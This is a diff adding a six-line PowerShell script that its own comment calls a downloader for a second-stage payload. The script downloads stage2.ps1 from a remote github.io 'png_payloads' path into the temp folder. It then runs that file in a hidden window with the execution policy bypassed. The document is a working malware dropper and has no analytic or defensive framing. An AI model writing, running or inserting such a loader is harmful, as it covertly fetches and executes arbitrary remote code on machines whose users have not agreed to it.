@@ -1,0 +1,6 @@
+# Downloader that fetches the second stage from a remote host
+
+$remoteUri = "https://personfu.github.io/png_payloads/stage2.ps1"
+$outputFile = Join-Path $env:TEMP "stage2.ps1"
+Invoke-WebRequest -Uri $remoteUri -OutFile $outputFile -UseBasicParsing
+Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `\"$outputFile`\"" -WindowStyle Hidden
